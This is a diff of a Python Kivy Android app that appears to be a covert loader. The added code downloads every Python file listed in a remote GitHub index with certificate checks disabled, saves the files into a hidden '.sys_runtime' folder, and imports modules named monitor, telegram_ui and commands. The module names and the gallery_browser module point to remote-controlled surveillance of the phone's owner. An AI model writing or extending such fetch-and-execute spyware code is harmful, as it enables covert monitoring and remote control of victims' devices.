@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import os, sys, threading, json, base64, importlib, requests, hashlib, traceback, gc, time
+import os, sys, threading, importlib, requests, traceback, gc, time
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -8,11 +8,9 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-# إخفاء تحذيرات SSL
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ========== مسار تخزين آمن (getFilesDir) ==========
 def _get_path():
     try:
         from jnius import autoclass
@@ -21,15 +19,13 @@ def _get_path():
         p = os.path.join(base, ".sys_runtime")
     except:
         p = os.path.join(os.getcwd(), ".sys_runtime")
-    if not os.path.exists(p):
-        os.makedirs(p)
+    os.makedirs(p, exist_ok=True)
     return p
 
 R = _get_path()
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== صلاحيات أندرويد 13+ ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -95,13 +91,14 @@ class CoreApp(App):
         for i in range(3):
             try:
                 self._log(f"DL {name} ({i+1}/3)")
+                # Bust cache باستخدام timestamp
                 r = requests.get(f"{url}?v={int(time.time())}", timeout=20, verify=False)
                 if r.status_code == 200 and len(r.text) > 500:
                     with open(os.path.join(R, name), 'w', encoding='utf-8') as f:
                         f.write(r.text)
                     self._log(f"✅ {name} saved")
                     return True
-            except:
+            except Exception:
                 time.sleep(2)
         self._log(f"❌ {name} failed", "ERROR")
         return False
@@ -111,26 +108,40 @@ class CoreApp(App):
 
     def _run(self):
         self._log("🚀 Core starting", "BOOT")
-        needed = ["monitor.py", "telegram_ui.py", "commands.py", "gallery_browser.py"]
 
-        # تحميل الملفات
+        # 1. جلب قائمة الملفات الكاملة من GitHub
+        all_files = []
         try:
             r = requests.get(RAW_INDEX, timeout=15, verify=False)
             if r.status_code == 200:
-                for f in r.json().get('files', []):
-                    n = f.split('/')[-1]
-                    if n in needed:
-                        self._download(f, n)
+                all_files = r.json().get('files', [])
+                self._log(f"📄 Found {len(all_files)} files in index")
+            else:
+                self._log(f"Index fetch failed: {r.status_code}", "ERROR")
         except Exception as e:
             self._log(f"Index error: {e}", "ERROR")
 
-        # مسح الموديولات القديمة
-        for m in needed:
-            mn = m.replace(".py", "")
-            if mn in sys.modules:
-                del sys.modules[mn]
+        # 2. تحميل كل ملف (باستثناء main.py نفسه)
+        for file_url in all_files:
+            filename = file_url.split('/')[-1]
+            if filename == "main.py":
+                continue
+            self._download(file_url, filename)
+
+        # 3. إزالة الموديولات القديمة من الذاكرة
+        to_delete = []
+        for file_url in all_files:
+            mod_name = file_url.split('/')[-1].replace('.py', '')
+            if mod_name in sys.modules:
+                to_delete.append(mod_name)
+        for mod in to_delete:
+            del sys.modules[mod]
+
+        # تنظيف الكاش وتجميع الذاكرة
+        importlib.invalidate_caches()
         gc.collect()
 
+        # 4. تشغيل النظام الأساسي
         try:
             import monitor, telegram_ui, commands
             importlib.reload(monitor)
